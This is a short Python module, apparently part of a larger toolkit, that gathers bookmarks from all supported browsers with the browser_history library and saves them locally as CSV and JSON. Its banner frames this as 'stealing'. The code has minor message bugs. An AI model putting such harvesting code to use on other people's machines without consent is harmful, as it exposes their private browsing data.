import os

from browser_history import get_bookmarks

from config import Constant
from config import ModuleManager


class WebBookmarksRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_path="browsers/bookmarks")
        
        self.banner(r"""
     _______         ______              _                       _          
    |.-----.|       (____  \            | |                     | |         
    ||x . x||        ____)  ) ___   ___ | |  _ ____  _____  ____| |  _  ___ 
    ||_.-._||       |  __  ( / _ \ / _ \| |_/ )    \(____ |/ ___) |_/ )/___)
    `--)-(--`       | |__)  ) |_| | |_| |  _ (| | | / ___ | |   |  _ (|___ |
   __[=== o]___     |______/ \___/ \___/|_| \_)_|_|_\_____|_|   |_| \_|___/ 
  |:::::::::::|\    
  `-=========-`()       Stealing bookmarks from all supported browsers
                """)
        
        self.output_filename_csv = self.module_output / 'browser_bookmarks_all.csv'
        self.output_filename_json = self.module_output / 'browser_bookmarks_all.json'

    def run(self):
        try:
            self.mdebug("Starting to load all Bookmarks from supported browsers")
            outputs = get_bookmarks()
            self.mprint("Loaded all bookmarks from supported browsers")
        except Exception as e:
            self.merror(f"Unable to load all bookmarks: {e}. Skipping this module")
            return
        
        if Constant.browser_bookmark_csv:
            try:
                outputs.save(f'{self.output_filename_csv}')
                self.mprint(f"Saved Browser Bookmarks as CSV to: {self.output_filename_csv}")
            except Exception as e:
                self.merror(f"Unable to save Browser Bookmarks as CSV to: {self.output_filename_csv}")
    
        if Constant.browser_bookmark_json:
            try:
                outputs.save(f'{self.output_filename_json}')
                self.mprint(f"Saved Browser Bookmarks as JSON to: {self.output_filename_csv}")
            except Exception as e:
                self.merror(f"Unable to save Browser Bookmarks as JSON to: {self.output_filename_csv}")
